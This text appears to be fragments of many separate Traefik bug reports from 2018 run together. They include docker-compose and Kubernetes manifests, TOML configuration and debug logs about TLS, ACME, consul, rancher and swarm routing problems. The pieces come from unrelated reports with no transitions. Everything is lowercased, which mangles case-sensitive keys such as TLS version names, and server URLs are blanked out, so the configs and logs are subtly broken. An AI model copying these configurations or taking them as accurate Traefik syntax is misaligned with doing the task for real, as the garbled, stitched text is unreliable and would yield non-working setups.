time="2018-05-02t12:59:23+02:00" level=debug msg="creating route route-frontend-host-web-devmyenterprise-dockerdev-world-direct-at-1 host:web.devmyenterprise.dockerdev.world-direct.at"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating backend backend-web-devmyenterprise"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating load-balancer wrr"
time="2018-05-02t12:59:23+02:00" level=debug msg="creating server server-devmyenterprise-web-1 at with weight 1"
time="2018-05-02t12:59:23+02:00" level=info msg="server configuration reloaded on :80"
time="2018-05-02t12:59:23+02:00" level=info msg="server configuration reloaded on :8181"
``` </details>
docker-compose.yml
version: '3.5'
services: init: image: traefik:1.5.4 command: - storeconfig - --defaultentrypoints=http,https - --entrypoints=name:http address::80 redirect.entrypoint:https - --entrypoints=name:https address::443 compress:true tls - --entrypoints=name:traefik address::8080 - --acme - --acme.entrypoint=https - --acme.storage=traefik/acme/account - --acme.email=admin@example.com - --acme.dnschallenge.provider=route53 - --acme.onhostrule - --docker - --docker.swarmmode - --docker.watch - --docker.domain=example.com - --docker.exposedbydefault=false - --docker.endpoint=tcp://docker.socket:2376 - --docker.tls - --docker.tls.ca=/run/secrets/socket-ca.pem - --docker.tls.cert=/run/secrets/socket-cert.pem - --docker.tls.key=/run/secrets/socket-key.pem - --ping - --consul - --consul.endpoint=consul.server:8500 - --consul.prefix=traefik/v1 deploy: restart_policy: condition: on-failure proxy: image: traefik:1.5.4 env_file: - secrets.env networks: - default - reverse-proxy ports: - '80:80' - '443:443' secrets: - source: docker-socket-ca-cert-v1 target: socket-ca.pem - source: docker-socket-traefik-cert-v1 target: socket-cert.pem - source: docker-socket-traefik-key-v1 target: socket-key.pem command: - --consul - --consul.endpoint=consul.server:8500 - --consul.prefix=traefik/v1
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch)
here's the result of `traefik storeconfig`
formatted for your eyeballs, and omitted irrelevant parts
notice that ca has a value.
traefik_init.1.tzt8mwnwqy1c@linuxkit-00155d00681d | 2018/04/29 09:53:00 storing configuration:
{ "lifecycle":{ "requestacceptgracetimeout":0, "gracetimeout":10000000000 }, ..
"docker":{ "watch":true, "filename":"", "constraints":null, "trace":false, "debugloggeneratedtemplate":false, "endpoint":"tcp://docker.socket:2376", "domain":"example.com", "tls":{ "ca":"/run/secrets/socket-ca.pem", "caoptional":false, "cert":"/run/secrets/socket-cert.pem", "key":"/run/secrets/socket-key.pem", "insecureskipverify":false }, "exposedbydefault":false, "usebindportip":false, "swarmmode":true }, ..
"ping":{ "entrypoint":"traefik" }
``` here's the output of the running traefik instance
notice that ca is now an empty string.
traefik_proxy.1.sw95mqlige09@linuxkit-00155d00681d | time="2018-04-29t10:19:22z" level=info msg="traefik version v1.6.0-rc6 built on 2018-04-17_11:59:31am"
traefik_proxy.1.sw95mqlige09@linuxkit-00155d00681d | time="2018-04-29t10:19:22z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
traefik_proxy.1.sw95mqlige09@linuxkit-00155d00681d | time="2018-04-29t10:19:22z" level=debug msg="global configuration loaded { "lifecycle":{ "requestacceptgracetimeout":0, "gracetimeout":10000000000 }, ..
"docker":{ "watch":true, "filename":"", "constraints":null, "trace":false, "debugloggeneratedtemplate":false, "endpoint":"tcp://docker.socket:2376", "domain":"example.com", "tls":{ "ca":"", "caoptional":false, "cert":"/run/secrets/socket-cert.pem", "key":"/run/secrets/socket-key.pem", "insecureskipverify":false }, "exposedbydefault":false, "usebindportip":false, "swarmmode":true }, ..
"ping":{ "entrypoint":"traefik" }
``` the value is being properly set by `storeconfig`:
![image]( i'd be happy to address the bug myself, if someone could give me some pointers of where to look.
debug = true loglevel = "debug"
defaultentrypoints = ["http"] [entrypoints] [entrypoints.ping] address = ":8082" [entrypoints.api] address = ":8080" [entrypoints.http] address = ":80" [retry] [ping]
entrypoint = "ping" [api]
entrypoint = "api" [api.statistics] [file]
[backends] [backends.bct] [backends.bct.servers] [backends.bct.servers.server0] # url = " " url = " " [frontends] [frontends.bct] entrypoints = ["http"] backend = "bct" [docker] endpoint = "unix:///var/run/docker.sock" # domain = "docker.for.mac.host.internal" domain = "localhost" watch = true exposedbydefault = false ```
### if applicable, please paste the log output at debug level (`--loglevel=debug` switch)
no toml config, using defaults with these commands: ```
--ping.entrypoint=http
--ecs.clusters=my-ecs-cluster
--ecs.exposedbydefault=false
--loglevel=debug
defaultentrypoints = ["http", "https"]
email = "hidden@secret.com"
storage = "/etc/traefik/acme.json"
entrypoint = "https"
onhostrule = true
[acme.httpchallenge] entrypoint = "http"
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls]
address = ":8080"
[web.metrics.statsd]
address = "telegraf-service-telegraf-1:8125"
pushinterval = "10s"
[web.statistics] recenterrors = 10 [web.auth.basic] usersfile = "/etc/traefik/webui.htpasswd"
filename = "/etc/traefik/rules.toml"
watch = true
domain = "skinfra.cloud"
watch = true
[rancher.metadata]
prefix = "/2016-07-29"
``` additional information :
we are running traefik on rancher
traefik is used to proxy our containers and add https with letsencrypt
we are using it with nginx (for the cache) in front of our application (odoo).
on some webpages users encounter the following error half the time : xmlhttprequesterror 502 bad gateway.
this only seem to happen if we access the page in https (auto redirect is disabled for now) through traefik.
if we access our application directly through another nginx with https configured we can't reproduce the issue.
same if we access the application through traefik via the http entrypoint it works fine.
debug = true
loglevel = "debug"
[entrypoints] [entrypoints.http] address = ":80"
endpoint = "tcp://192.168.1.8:2375"
[metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.3,1.2,5.0]
### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
time="2018-04-16t16:54:13z" level=error msg="recovered from panic in http handler: runtime error: invalid memory address or nil pointer dereference"
domain = "docker.local"
swarmmode = true [api]
debug = true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls]
### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ``` ```
maxidleconnsperhost = 100000 [consul] endpoint = "127.0.0.1:8500" watch = true prefix = "traefik" [entrypoints] [entrypoints.traefik] address="127.0.0.1:8081" [api] entrypoint = "traefik" [ping] entrypoint = "http" [consulcatalog] endpoint="127.0.0.1:8500" watch = true domain = "app.com" prefix = "traefik" exposedbydefault = false [metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] ``` platform is centos 7, consul 1.0.2.
services is published into consul catalog using simple json configs.
traefik.toml
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80"
``` traefik-services.toml
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":80" [backends.backend1] [backends.backend1.servers.server1] url = " " [frontends.frontend1]
entrypoints = ["http"]
passhostheader = true
backend = "backend1" [frontends.frontend1.routes.route1] rule = "pathprefixstrip:/1" {{$servers := dict}} {{$_ := set $servers "2" "1"}}
{{$_ := set $servers "3" "2"}}
{{$_ := set $servers "4" "3"}}
{{$_ := set $servers "5" "4"}}
{{$_ := set $servers "6" "5"}}
{{$_ := set $servers "7" "6"}}
{{$_ := set $servers "8" "7"}}
{{$_ := set $servers "9" "8"}}
{{$_ := set $servers "10" "9"}}
{{$_ := set $servers "11" "10"}}
{{$_ := set $servers "12" "11"}}
{{$_ := set $servers "13" "12"}}
{{$_ := set $servers "14" "13"}}
{{$_ := set $servers "15" "14"}}
{{$_ := set $servers "16" "15"}}
{{$_ := set $servers "17" "16"}}
{{$_ := set $servers "18" "17"}}
{{$_ := set $servers "19" "18"}}
{{$_ := set $servers "20" "19"}} {{range $i, $j := $servers}} [backends.backend{{$i}}] [backends.backend{{$i}}.servers.server1] url = " {{$j}}" [frontends.frontend{{$i}}] entrypoints = ["http"] passhostheader = true backend = "backend{{$i}}" [frontends.frontend{{$i}}.routes.route1] rule = "pathprefixstrip:/{{$i}}"
``` docker-compose.yml
version: \'3\' services: traefik: image: traefik:1.6.0-rc4 command: --loglevel=warn --docker --docker.filename=/traefik-services.toml --accesslog --accesslog.filepath=/dev/stderr volumes: - /var/run/docker.sock:/var/run/docker.sock - ./traefik.toml:/traefik.toml:ro - ./traefik-services.toml:/traefik-services.toml:ro ports: - 127.0.0.1:80:80 server: image: node:alpine command: [node, -e, "require(\'http\').createserver((req, res) => res.end(\'hello from server\')).listen(80); process.on(\'sigterm\', () => process.exit(128 + 15));"]
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) see attached file logs.txt [logs.txt](
[mario.png](
my traefik config is: ```toml
[entrypoints] [entrypoints.http] address = ":5555" compress = false [entrypoints.http.proxyprotocol] trustedips = ["10.0.0.0/8"] [entrypoints.traefik_api] address = ":1111" compress = false [ping] entrypoint = "http" [consulcatalog]
endpoint = "127.0.0.1:8450"
exposedbydefault = false
prefix = "traefik" [api] entrypoint = "traefik_api" dashboard = true debug = true
[traefiklog] format = "json"
[accesslog] format = "json"
defaultentrypoints = ["http"]
``` frontend rule is exposed via service tag: `traefik.frontend.rule=host:example.com`
<summary>configuration</summary> ```toml
# bash-4.4# cat /config/traefik.toml
################################################################
# global configuration
################################################################ # enable debug mode
# default: false
debug = false # log level
# default: "error"
loglevel = "error" # entrypoints to be used by frontends that do not specify any entrypoint.
# each frontend can specify its own entrypoints.
# default: ["http"]
# defaultentrypoints = ["http", "https"]
defaultentrypoints = ["https"] # entrypoints definition
# default: [entrypoints] [entrypoints.traefik] address = ":8080" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl_config/service.crt" keyfile = "/ssl_config/service.key" [accesslog] # sets the file path for the access log
if not specified, stdout will be used.
# intermediate directories are created if necessary.
# default: os.stdout
# filepath = "/path/to/log/log.txt" # format is either "json" or "common".
# default: "common"
format = "json" [metrics] [metrics.influxdb] # influxdb\'s address
# # required # default: "localhost:8089" # address = "localhost:8087" # influxdb push interval # # optional # default: "10s" # pushinterval = "10s" [api] entrypoint = "traefik" dashboard = true ################################################################
# dynamodb configuration backend
################################################################ # enable dynamodb configuration backend.
[dynamodb] # region to use when connecting to aws.
region = "us-east-1" # dyanmodb table name.
# default: "traefik"
tablename = "traefik_routing_dev" # enable watch dynamodb changes.
# default: true
watch = true # polling interval (in seconds).
# default: 15
refreshseconds = 10
``` </details>
<details>
<summary> backends at the time of the above data collection</summary> ```json
{ "dynamodb":{ "backends":{ "pipeline_api":{ "servers":{ "data-pipeline-api-test-1":{ "url":" ", "weight":0 }, "data-pipeline-api-test-2":{ "url":" ", "weight":0 } }, "loadbalancer":{ "method":"wrr", "stickiness":{ "cookiename":"3983224698189305043" } }, "healthcheck":{ "path":"/health_check", "port":5556, "interval":"10" } }, "primespeed_load_generator":{ "servers":{ "ops-primespeed-load-generator-test-10":{ "url":" ", "weight":0 }, "ops-primespeed-load-generator-test-9":{ "url":" ", "weight":0 } }, "loadbalancer":{ "method":"wrr", "stickiness":{ "cookiename":"4981722866654283343" } }, "healthcheck":{ "path":"/", "port":80, "interval":"10" } }, "schema_registry":{ "servers":{ "data-schema-registry-test-1":{ "url":" ", "weight":0 }, "data-schema-registry-test-2":{ "url":" ", "weight":0 } }, "loadbalancer":{ "method":"wrr", "stickiness":{ "cookiename":"-7539791700055208120" } }, "healthcheck":{ "path":"/health_check", "port":8888, "interval":"10" } }, "translateproxy":{ "servers":{ "data-translateproxy-test-48":{ "url":" ", "weight":0 }, "data-translateproxy-test-49":{ "url":" ", "weight":0 } }, "loadbalancer":{ "method":"wrr", "stickiness":{ "cookiename":"2775863960964999634" } }, "healthcheck":{ "path":"/status.json", "port":8081, "interval":"10" } } }, "frontends":{ "pipeline_api":{ "entrypoints":[ "https" ], "backend":"pipeline_api", "routes":{ "pipeline_api":{ "rule":"headers: x-dm-role, pipeline_api" } }, "passhostheader":true, "priority":0, "basicauth":null, "headers":{ } }, "primespeed_load_generator":{ "entrypoints":[ "https" ], "backend":"primespeed_load_generator", "routes":{ "primespeed_load_generator":{ "rule":"headers: x-dm-role, primespeed_load_generator" } }, "passhostheader":true, "priority":0, "basicauth":null, "headers":{ } }, "schema_registry":{ "entrypoints":[ "https" ], "backend":"schema_registry", "routes":{ "schema_registry":{ "rule":"headers: x-dm-role, schema_registry" } }, "passhostheader":true, "priority":0, "basicauth":null, "headers":{ } }, "translateproxy":{ "entrypoints":[ "https" ], "backend":"translateproxy", "routes":{ "translateproxy":{ "rule":"headers: x-dm-role, translateproxy" } }, "passhostheader":true, "priority":0, "basicauth":null, "headers":{ } } } }
apiversion: v1
kind: service
metadata: name: external-ingress-proxy namespace: sys-ingress-pub
spec: selector: app: external-ingress-proxy type: nodeport ports: - name: http port: 80 nodeport: 30180 - name: https-proto port: 443 nodeport: 30143 selector: k8s-app: external-ingress-proxy
apiversion: apps/v1
kind: deployment
metadata: name: external-ingress-proxy namespace: sys-ingress-pub labels: k8s-app: external-ingress-proxy
spec: replicas: 1 selector: matchlabels: k8s-app: external-ingress-proxy revisionhistorylimit: 8 template: metadata: labels: k8s-app: external-ingress-proxy name: external-ingress-proxy spec: terminationgraceperiodseconds: 60 containers: - image: traefik:1.6.0-rc3-alpine name: traefik ports: - containerport: 80 - containerport: 443 - containerport: 8080 args: - --web - --web.metrics - --web.metrics.prometheus - --loglevel=info - --kubernetes - --kubernetes.labelselector=kubernetes.io/ingress.class=traefik-public - --entrypoints=name:http-redirect address::80 redirect.entrypoint:https-proto - --entrypoints=name:https-proto address::443 tls - --defaultentrypoints=http-redirect,https-proto ```
apiversion: extensions/v1beta1
kind: ingress
metadata: name: nginx namespace: sys-mon annotations: kubernetes.io/tls-acme: "true" kubernetes.io/ingress.class: traefik labels: kubernetes.io/ingress.class: traefik-public
spec: tls: - secretname: traefik-test-tls-cert rules: - host: myservice.io http: paths: - path: / backend: servicename: nginx serviceport: 80
apiversion: v1
kind: service
metadata: name: nginx namespace: sys-mon labels: name: nginx
spec: selector: app: nginx ports: - name: web port: 80
apiversion: apps/v1
kind: deployment
metadata: name: nginx namespace: sys-mon
spec: replicas: 1 selector: matchlabels: app: nginx template: metadata: name: nginx namespace: sys-mon labels: app: nginx spec: containers: - name: nginx image: nginx ports: - name: web containerport: 80
rbac clusterrolebinding:
name: traefik-test
labels: <none>
annotations: <none>
role: kind: clusterrole name: cluster-admin
subjects: kind name namespace ---- ---- --------- serviceaccount default sys-ingress-pub
the secret with the cert:
name: traefik-test-tls-cert
namespace: sys-mon
labels: <none>
annotations: <none>
type: kubernetes.io/tls
tls.crt: 1034 bytes
tls.key: 1704 bytes
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
time="2018-04-04t08:57:49z" level=warning msg="web provider configuration is deprecated, you should use these options : api, rest provider, ping and metrics"
time="2018-04-04t08:57:49z" level=info msg="traefik version v1.6.0-rc3 built on 2018-03-28_04:04:00pm"
time="2018-04-04t08:57:49z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-04-04t08:57:49z" level=info msg="preparing server https-proto &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-04-04t08:57:51z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-04-04t08:57:51z" level=info msg="starting server on :443"
time="2018-04-04t08:57:51z" level=info msg="preparing server http-redirect &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-04-04t08:57:51z" level=info msg="starting server on :8080"
time="2018-04-04t08:57:51z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"kubernetes.io/ingress.class=traefik-public\\",\\"ingressclass\\":\\"\\"}"
time="2018-04-04t08:57:51z" level=info msg="starting server on :80"
time="2018-04-04t08:57:51z" level=info msg="creating in-cluster provider client"
time="2018-04-04t08:57:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist"
time="2018-04-04t08:57:52z" level=info msg="server configuration reloaded on :80"
time="2018-04-04t08:57:52z" level=info msg="server configuration reloaded on :443"
time="2018-04-04t08:57:52z" level=info msg="server configuration reloaded on :8080"
time="2018-04-04t09:07:51z" level=warning msg="error checking new version: get 403 api rate limit exceeded for 52.18.166.166
(but here's the good news: authenticated requests get a higher rate limit
check out the documentation for more details.); rate reset in 20m5.628041774s"
time="2018-04-04t09:07:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist"
time="2018-04-04t09:17:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist" w0404 09:20:39.482673 1 reflector.go:341] github.com/containous/traefik/vendor/k8s.io/client-go/informers/factory.go:86: watch of *v1.endpoints ended with: too old resource version: 5095910 (5096509)
time="2018-04-04t09:27:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist"
time="2018-04-04t09:37:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist" w0404 09:45:27.582778 1 reflector.go:341] github.com/containous/traefik/vendor/k8s.io/client-go/informers/factory.go:86: watch of *v1.endpoints ended with: too old resource version: 5098162 (5098951)
time="2018-04-04t09:47:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist"
time="2018-04-04t09:57:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist"
time="2018-04-04t10:07:52z" level=error msg="error configuring tls for ingress sys-mon/nginx: secret sys-mon/traefik-test-tls-cert does not exist" ```
docker run -v /var/run/docker.sock:/var/run/docker.sock traefik:1.6.0-rc2 --docker --api --debug
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
time="2018-03-28t13:49:24z" level=debug msg="filtering container with empty frontend rule /test "
toml is autogenerated by the `rawmind/alpine-traefik`
i got this out of the container in any case
```toml # traefik.toml
debug = true
loglevel = "info"
insecureskipverify = false
defaultentrypoints = ["http", "https"]
sendanonymoususage = false [traefiklog] filepath = "/opt/traefik/log/traefik.log" [accesslog] filepath = "/opt/traefik/log/access.log" [respondingtimeouts] readtimeout = "0s" writetimeout = "0s" idletimeout = "180s" [forwardingtimeouts] dialtimeout = "30s" responseheadertimeout = "0s" [entrypoints] [entrypoints.traefik] address = ":8000" compress = true [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] minversion = "versiontls12" [[entrypoints.https.tls.certificates]] certfile = "/opt/traefik/certs/traefik.crt" keyfile = "/opt/traefik/certs/traefik.key" [api] entrypoint = "traefik" dashboard = true debug = true [api.statistics] recenterrors = 10 [rest] entrypoint = "traefik" [ping] entrypoint = "traefik" [rancher] domain = "rancher.internal" watch = true refreshseconds = 15 exposedbydefault = false enableservicehealthfilter = false [rancher.metadata] intervalpoll = false prefix = "/2016-07-29"
``` ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```shell
# only pertinent output:
test-platform-traefik-1 | 2018-03-27t15:46:31.496406533z time="2018-03-27t15:46:31z" level=debug msg="map[traefik.echoapi.frontend.rule:pathprefixstrip:/echo traefik.echoapi.port:8080 traefik.enable:true io.rancher.container.pull_image:always io.rancher.service.hash:935abe2d05e52b2a1fe994849097f0b0d5fd888e] map[:map[traefik.enable:true] echoapi:map[traefik.port:8080 traefik.frontend.rule:pathprefixstrip:/echo]]" test-platform-traefik-1 | 2018-03-27t15:46:31.496778748z time="2018-03-27t15:46:31z" level=debug msg="map[io.rancher.service.hash:935abe2d05e52b2a1fe994849097f0b0d5fd888e traefik.echoapi.frontend.rule:pathprefixstrip:/echo traefik.echoapi.port:8080 traefik.enable:true io.rancher.container.pull_image:always] map[echoapi:map[traefik.frontend.rule:pathprefixstrip:/echo traefik.port:8080] :map[traefik.enable:true]]"
test-platform-traefik-1 | 2018-03-27t15:46:31.497851290z time="2018-03-27t15:46:31z" level=debug msg="validation of load balancer method for backend backend-echotest-test-platform-echotest-test-platform-echoapi failed: invalid load-balancing method \'\'
using default method wrr."
test-platform-traefik-1 | 2018-03-27t15:46:31.497867119z time="2018-03-27t15:46:31z" level=debug msg="configuration received from provider rancher: {\\"backends\\":{\\"backend-echotest-test-platform-echotest-test-platform-echoapi\\":{\\"servers\\":{\\"server-0\\":{\\"url\\":\\" ",\\"weight\\":0}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-echotest-test-platform-echotest-test-platform-echoapi\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend-echotest-test-platform-echotest-test-platform-echoapi\\",\\"routes\\":{\\"route-frontend-echotest-test-platform-echotest-test-platform-echoapi\\":{\\"rule\\":\\"host:echotest.test-platform.rancher.internal\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]}}} test-platform-traefik-1 | 2018-03-27t15:46:39.132713545z time="2018-03-27t15:46:39z" level=debug msg="map[io.rancher.container.pull_image:always io.rancher.service.hash:935abe2d05e52b2a1fe994849097f0b0d5fd888e traefik.echoapi.frontend.rule:pathprefixstrip:/echo traefik.echoapi.port:8080 traefik.enable:true] map[:map[traefik.enable:true] echoapi:map[traefik.frontend.rule:pathprefixstrip:/echo traefik.port:8080]]"
test-platform-traefik-1 | 2018-03-27t15:46:39.143976831z time="2018-03-27t15:46:39z" level=debug msg="validation of load balancer method for backend backend-echotest-test-platform-echotest-test-platform-echoapi failed: invalid load-balancing method \'\'
using default method wrr."
test-platform-traefik-1 | 2018-03-27t15:46:39.143990211z time="2018-03-27t15:46:39z" level=debug msg="configuration received from provider rancher: {\\"backends\\":{\\"backend-echotest-test-platform-echotest-test-platform-echoapi\\":{\\"servers\\":{\\"server-0\\":{\\"url\\":\\" ",\\"weight\\":0}},\\"loadbalancer\\":{\\"method\\":\\"wrr\\"}}},\\"frontends\\":{\\"frontend-echotest-test-platform-echotest-test-platform-echoapi\\":{\\"entrypoints\\":[\\"http\\",\\"https\\"],\\"backend\\":\\"backend-echotest-test-platform-echotest-test-platform-echoapi\\",\\"routes\\":{\\"route-frontend-echotest-test-platform-echotest-test-platform-echoapi\\":{\\"rule\\":\\"host:echotest.test-platform.rancher.internal\\"}},\\"passhostheader\\":true,\\"priority\\":0,\\"basicauth\\":[]}}}"
linux debian 9, no configuraction ### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) same output as above
i already "played" with some values like the timeouts
it did not change the behaviour
defaultentrypoints = ["http","https"]
checknewversion = false
providersthrottleduration = 5
maxidleconnsperhost = 400
rootcas = [ "/usr/local/share/ca-certificates/*[munched]*.crt" ] [traefiklog] filepath = "/dev/stdout" format = "json" [accesslog] filepath = "/dev/stdout" format = "json" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/*[munched]*.crt" keyfile = "/etc/ssl/*[munched]*.key" [docker]
endpoint = "unix:///var/run/docker.sock"
swarmmode = true
domain = "*[munched]*"
watch = true [web]
address = ":8080" [lifecycle]
requestacceptgracetimeout = "60s"
gracetimeout = "720s" [respondingtimeouts]
readtimeout = "60s"
writetimeout = "60s"
idletimeout = "720s" [forwardingtimeouts]
dialtimeout = "360s"
our docker swarm has 15 nodes with 3 of them are manager nodes
<summary>stack-file:</summary> ```yml
version: '3'
services: traefik: image: *[munched]* command: --configfile=/etc/traefik/traefik.toml networks: - traefik ports: - 80:80 - 443:443 volumes: - /var/run/docker.sock:/var/run/docker.sock deploy: mode: global update_config: parallelism: 1 delay: 5s labels: - traefik.port=8080 - traefik.docker.network=atam_ata-management placement: constraints: - node.role == manager
networks: default: traefik: external: name: atam_ata-management
``` </details> <details>
<summary>stack of the service:</summary> ```yml
version: '3'
services: *[munched]*: image: *[munched]* networks: traefik: default: aliases: - *[munched]* deploy: labels: traefik.port: 8080 traefik.backend.maxconn.amount: 200 traefik.backend.maxconn.extractorfunc: client.ip traefik.docker.network: atam_ata-management traefik.backend.loadbalancer.swarm: "true" traefik.frontend.passhostheader: "true" mode: replicated replicas: 12 placement: constraints: - node.labels.fileserver == true - node.labels.os == linux volumes: - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]* - *[munched]*
networks: default: traefik: external: name: atam_ata-management
``` </details> <details>
<summary>docker inspect of the traefik overlay network:</summary> ```json
[ { "name": "atam_ata-management", "id": "60s7dkowl737sby957jlb1w44", "created": "2018-03-16t17:40:53.928194481+01:00", "scope": "swarm", "driver": "overlay", "enableipv6": false, "ipam": { "driver": "default", "options": null, "config": [ { "subnet": "10.0.0.0/24", "gateway": "10.0.0.1" } ] }, "internal": false, "attachable": true, "ingress": false, "configfrom": { "network": "" }, "configonly": false, "containers": { "82be609085dd3149b3b7a3831200444c55333d565d0a8cb9988b05c1b0befbd5": { "name": "atam_traefik.mzjsw8wtkb0clj3txi2b0q1dw.q0n1e7zqoe3u4md4djy8x9bpy", "endpointid": "198f6f2207a7d31f5ec268816a83c44df4e234e2d44eb6b449f1fec59f076ceb", "macaddress": "02:42:0a:00:00:ed", "ipv4address": "10.0.0.237/24", "ipv6address": "" }, "b1b46b795431df88d4bca805613d666bd68ee3da709a797e5e809bdc5f108ace": { "name": "swarm_weave.mzjsw8wtkb0clj3txi2b0q1dw.iotwqg1jngysxz5u02ieny8am", "endpointid": "a9c624767ea366d8794f569fbf8cb41743ee583c06fa42ddf8fee5deaa7c2b6b", "macaddress": "02:42:0a:00:00:29", "ipv4address": "10.0.0.41/24", "ipv6address": "" }, "fbfc766913a94078bdd3562a6268ff3ccef94798260f9e673aaeeedb8004f1d0": { "name": "swarm_portainer.1.oeijbavgsrujkq8uuw2bkb7wy", "endpointid": "c88c13eff2aa43a93b3789c06ea8e8009d2ff7b227e814b46304863a069a49a0", "macaddress": "02:42:0a:00:00:32", "ipv4address": "10.0.0.50/24", "ipv6address": "" } }, "options": { "com.docker.network.driver.overlay.vxlanid_list": "4097" }, "labels": {}, "peers": [ { "name": "e015486d9ae5", "ip": "10.10.11.108" }, { "name": "8093bbbb968a", "ip": "10.10.12.73" }, { "name": "ff1d19a9f660", "ip": "10.131.4.32" }, { "name": "48206a080716", "ip": "10.10.11.113" }, { "name": "de463f919f9b", "ip": "10.131.4.33" }, { "name": "4c4a8e644aa5", "ip": "10.10.11.107" }, { "name": "1c3336e193cf", "ip": "10.131.4.35" }, { "name": "bcff64b059df", "ip": "10.10.11.114" }, { "name": "b11eb0d288b9", "ip": "10.131.4.31" }, { "name": "91d9aabbff9e", "ip": "10.10.12.72" }, { "name": "2bd47092ad8e", "ip": "10.131.4.34" }, { "name": "1d204c14ce4b", "ip": "10.10.11.66" }, { "name": "799d3a87e548", "ip": "10.10.11.106" } ] }
``` </details> ### if applicable, please paste the log output in debug mode (`--debug` switch) ```json
{"backendaddr":"10.0.0.24:8080","backendname":"*[munched]*","backendurl":{"scheme":"http","opaque":"","user":null,"host":"10.0.0.24:8080","path":"","rawpath":"","forcequery":false,"rawquery":"","fragment":""},"clientaddr":"10.255.0.10:58811","clienthost":"10.255.0.10","clientport":"58811","clientusername":"-","downstreamcontentsize":21,"downstreamstatus":500,"downstreamstatusline":"500 internal server error","traefikduration":65840578,"frontendname":"*[munched]*","origincontentsize":21,"originduration":65512033,"originstatus":500,"originstatusline":"500 internal server error","overhead":328545,"requestaddr":"*[munched]*","requestcontentsize":0,"requestcount":351,"requesthost":"*[munched]*","requestline":"get *[munched]* http/1.1","requestmethod":"get","requestpath":"/d/472cea45ee404e22191e52fc6a620d62c06572bcb2b8b0ddef0517ee5a87e426","requestport":"-","requestprotocol":"http/1.1","retryattempts":0,"startlocal":"2018-03-20t10:01:29.980041729z","startutc":"2018-03-20t10:01:29.980041729z","traefiklog":"info","msg":"","time":"2018-03-20t10:01:30z"}
{"request":"{\\"method\\":\\"get\\",\\"url\\":{\\"scheme\\":\\"\\",\\"opaque\\":\\"\\",\\"user\\":null,\\"host\\":\\"\\",\\"path\\":\\"/d/472cea45ee404e22191e52fc6a620d62c06572bcb2b8b0ddef0517ee5a87e426\\",\\"rawpath\\":\\"\\",\\"forcequery\\":false,\\"rawquery\\":\\"\\",\\"fragment\\":\\"\\"},\\"proto\\":\\"http/1.1\\",\\"protomajor\\":1,\\"protominor\\":1,\\"header\\":{},\\"contentlength\\":0,\\"transferencoding\\":null,\\"host\\":\\"*[munched]*\\",\\"form\\":null,\\"postform\\":null,\\"multipartform\\":null,\\"trailer\\":null,\\"remoteaddr\\":\\"10.255.0.10:58811\\",\\"requesturi\\":\\"/d/472cea45ee404e22191e52fc6a620d62c06572bcb2b8b0ddef0517ee5a87e426\\",\\"tls\\":null}","traefiklog":"debug","msg":"vulcand/oxy/roundrobin/rr: competed servehttp on request","time":"2018-03-20t10:01:30z"}
